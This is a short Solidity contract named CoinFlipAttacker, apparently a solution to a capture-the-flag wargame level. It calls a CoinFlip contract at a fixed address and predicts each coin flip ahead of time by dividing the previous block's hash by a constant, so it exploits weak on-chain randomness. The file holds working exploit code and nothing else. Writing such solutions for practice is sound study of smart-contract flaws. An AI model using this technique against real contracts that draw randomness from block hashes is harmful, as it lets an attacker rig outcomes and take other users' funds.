pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

interface CoinFlip {
    function flip(
      bool _guess
    ) external returns (bool);
}

contract CoinFlipAttacker {

  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip coinFlipContract = CoinFlip(0x71AAd5158a1049286541c395941B58a51610Bae3);

  function flip() external  {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    coinFlipContract.flip(side);
  }
}